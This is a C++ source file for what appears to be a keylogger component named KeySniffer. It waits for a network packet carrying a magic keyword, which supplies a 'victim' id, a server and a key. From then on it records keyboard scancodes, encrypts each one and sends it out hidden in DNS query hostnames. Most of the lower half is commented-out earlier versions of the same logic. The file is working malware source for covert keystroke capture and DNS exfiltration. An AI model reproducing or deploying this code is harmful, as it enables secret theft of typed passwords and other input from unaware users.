#include "common/defines.h"
#include "common/common.hpp"
#include "common/messages.hpp"
#include "key_sniffer.hpp"

static const char *find_first_occurrence(const char* buf, size_t buf_size, const char *str);

KeySniffer KeySniffer::ksniffer;

KeySniffer *KeySniffer::Instance()
{
    return &ksniffer;
}

KeySniffer::KeySniffer()
    : sniffing_(false)
{

}

void KeySniffer::Sniff(int scancode)
{
    unsigned char in[128], out[1024];
    unsigned long inlen, outlen;

    if (!sniffing_) {
        return;
    }
    collector_.AddScancode(scancode);

    KeySniffingMessage message;
    message.victim = victim_;
    message.scancode = scancode;
    message.count = collector_.GetScancodeCount(scancode);

    inlen = message.Serialize(in, sizeof(in));
    if (cryptographer_.Encrypt(in, inlen, out, &outlen) == -1) {
        std::cout << "Fail occurred while encrypt" << std::endl;
    }

    out[outlen] = 0;
    std::string hostname = std::string((const char *)out) + DNS_NAME;
    if (sender_.SendDnsQuery(hostname) == -1) {
        std::cout << "Fail to send dns query" << std::endl;
    }

    std::cout << "Send dns query for '" << hostname << "'" << std::endl;
}

void KeySniffer::AnalyzePacket(const char *buf, size_t size)
{
    if (sniffing_) {
        std::cout << "KeySniffer: already sniff" << std::endl;
        return;
    }

    const char *msg_pos;
    StartSniffingMessage message;

    if ((msg_pos = find_first_occurrence(buf, size, MAGIC_KEYWORD)) == NULL) {
        std::cout << "No magic message" << std::endl;
        return;
    }
    std::cout << "Start sniffing message has been received!" << std::endl;

    if (message.Deserialize((const unsigned char *)msg_pos, size - (msg_pos - buf)) == -1) {
        std::cout << "Fail to deserialize start sniffing message" << std::endl;
    }

    sniffing_ = true;
    victim_ = message.victim;
    sender_.SetServer(message.server);
    cryptographer_.SetKey(message.public_key);

    std::cout << "Victim #" << message.victim << std::endl;
    std::cout << "Server " << std::string(inet_ntoa(message.server.sin_addr)) << ":" << message.port << std::endl;
}

static const char *find_first_occurrence(const char* buf, size_t buf_size, const char *str)
{
    size_t i;
    size_t len;

    len = strlen(str);

    if (buf_size < len) {
        return NULL;
    }

    for (i = 0; i < buf_size - len; ++i) {
        const char *start_pos = buf + i;
        if (memcmp(start_pos, str, len) == 0) {
            return start_pos;
        }
    }

    return NULL;
}

//void key_sniffer_analyze_packet(KeySniffer *ksniffer, const uint8_t *buf, size_t size)
//{
//    std::cout << "key_sniffer_analyze_packet" << std::endl;
////    if (ksniffer->sniffing) {
////        /* already sniffing */
////        print_msg("Already sniffing");
////        return;
////    }

////    PacketInfoPtr packet_info;
////    PacketAnalyzerPtr packet_analyzer;

////    packet_analyzer= ksniffer->packet_analyzer;
////    packet_info = packet_analyzer_analyze_packet(packet_analyzer, (const char *)buf, size);

////    if (packet_info->is_secret) {
////        ksniffer->sniffing = 1;
////        dns_query_sender_connect_to_server(ksniffer->sender, packet_info->server_ip, packet_info->port);
////        print_msg("Sniffing started...");
////    }

////    packet_info_delete(packet_info);
//}

//struct KeySniffer
//{
//    int id;
//    int sniffing;
////    DnsQuerySenderPtr sender;
////    PacketAnalyzerPtr packet_analyzer;
////    KeyStatCollectorPtr key_stat_collector;
////    CryptographerPtr cryptographer;
//};

//static KeySniffer ksniffer;
//static int initialized = 0;

//void sniffer_sniff(int scancode)
//{
//    std::cout << "sniffer_sniff" << std::endl;
//}

//void sniffer_analyze_packet(const uint8_t *buf, size_t size)
//{
//    std::cout << "sniffer_analyze_packet" << std::endl;
//}

////static const char *generate_dnsname_by_scancode(KeySnifferPtr ksniffer, int scancode)
////{
////    simple_do_stuff();

////    char buf[256];
////    int shift;

////    int scancode_count = key_stat_collector_get_scancode_count(ksniffer->key_stat_collector, scancode);

////    shift = 0;
////    memcpy(buf + shift, (const char *)(uint16_t *)&ksniffer->id, sizeof(uint16_t));
////    shift += sizeof(uint32_t);
////    memcpy(buf + shift, (const char *)(uint16_t *)&scancode, sizeof(uint16_t));
////    shift += sizeof(uint16_t);
////    memcpy(buf + shift, (const char *)(uint32_t *)&scancode_count, sizeof(uint32_t));
////    shift += sizeof(uint32_t);

////    const char *dnspart = 0;// = cryptographer_encrypt(ksniffer->cryptographer, buf, shift);

////    int dnslen = strlen(dnspart) + sizeof(DNS) + 1;
////    char *dnsname = (char *) malloc(dnslen);
////    strcpy(dnsname, dnspart);
////    strcpy(dnsname + strlen(dnspart), DNS);
////    dnsname[dnslen] = 0;

////    free((void *)dnspart);

////    return dnsname;
////}

////static void init_ksniffer(KeySnifferPtr ksniffer)
////{
////    DnsQuerySenderPtr sender = dns_query_sender_create();
////    PacketAnalyzerPtr packet_analyzer = packet_analyzer_create();
////    KeyStatCollectorPtr key_stat_collector = key_stat_collector_create();

////    ksniffer->sniffing = 0;
////    ksniffer->sender = sender;
////    ksniffer->packet_analyzer = packet_analyzer;
////    ksniffer->key_stat_collector = key_stat_collector;
////}

//KeySniffer *key_sniffer_get_instance(void)
//{
////    if (!initialized) {
////        init_ksniffer(&ksniffer);
////        initialized = 1;
////    }

//    return &ksniffer;
//}



//void key_sniffer_sniff(KeySniffer *ksniffer, int scancode)
//{
//    std::cout << "key_sniffer_sniff" << std::endl;
////    const char *dnsname;

////    if (ksniffer->sniffing) {
////        key_stat_collector_add_scancode(ksniffer->key_stat_collector, scancode);
////        dnsname = generate_dnsname_by_scancode(ksniffer, scancode);
////        dns_query_sender_send_dns_query(ksniffer->sender, dnsname);
////    }
//}
